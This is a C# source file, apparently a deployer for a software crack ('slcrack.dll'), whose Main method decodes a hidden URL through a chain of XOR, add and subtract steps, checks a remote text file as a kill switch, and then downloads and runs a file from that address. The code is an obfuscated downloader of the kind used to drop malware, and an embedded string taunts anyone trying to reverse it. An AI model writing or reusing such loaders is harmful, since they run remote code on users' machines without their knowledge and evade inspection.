using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text;
using System.Windows.Forms;

namespace DCT.Deployment
{
    internal class SLDeployer
    {
        [STAThread]
        private static void Main()
        {
            // --> to slcrack.dll
            Stack<int> stack = new Stack<int>(40);
            int bCrypt = 0;

            bCrypt = StackDecrypt(bCrypt, 1, 0x6C);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 0, 0x0);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 1, 0xF8);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 0, 0x36);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 1, 0x3D);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 2, 0x8);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 2, 0x2);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 1, 0x11);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 2, 0x11);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 0, 0xF7);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 1, 0x7);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 2, 0x5C);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 1, 0x3A);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 2, 0xA);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 1, 0x1);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 1, 0xCB);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 2, 0x5C);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 2, 0x1E);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 2, 0xC);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 1, 0x11);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 0, 0xB);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 0, 0xF8);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 1, 0x3);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 0, 0x2);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 0, 0x41);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 1, 0x44);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 0, 0xFE);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 2, 0x5B);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 0, 0xBF);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 1, 0x1);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 0, 0x0);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 1, 0x9);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 2, 0xD);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 2, 0x5B);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 0, 0x0);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 0, 0xF5);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 0, 0xCA);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 0, 0xFC);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 2, 0x0);
            stack.Push(bCrypt);
            bCrypt = StackDecrypt(bCrypt, 1, 0xF4);
            stack.Push(bCrypt);

            StringBuilder sb = new StringBuilder();
            while (stack.Count > 0)
            {
                sb.Append((char)stack.Pop());
            }

            string nothing = "It should be really easy to crack this part, but you're missing the point...";
            WebClient c = new WebClient();
            Stream s = c.OpenRead(sb.ToString() + ".txt");
            TextReader r = new StreamReader(s);
            string status = r.ReadToEnd();
            if (status != "go")
            {
                MessageBox.Show("Usage has been deactivated", "Not Starting", MessageBoxButtons.OK, MessageBoxIcon.Stop);
                Application.Exit();
                return;
            }

            Deployer.RunFromUrl(sb.ToString(), "A.e");
        }

        private static int StackDecrypt(int bCrypt, int iOpCode, int iSalt)
        {
            switch (iOpCode)
            {
                case 0:
                    bCrypt = bCrypt - iSalt;
                    break;
                case 1:
                case 3:
                    bCrypt = bCrypt ^ iSalt;
                    break;
                case 2:
                    bCrypt = bCrypt + iSalt;
                    break;
            }
            bCrypt = bCrypt & 255;
            return bCrypt;
        }
    }
}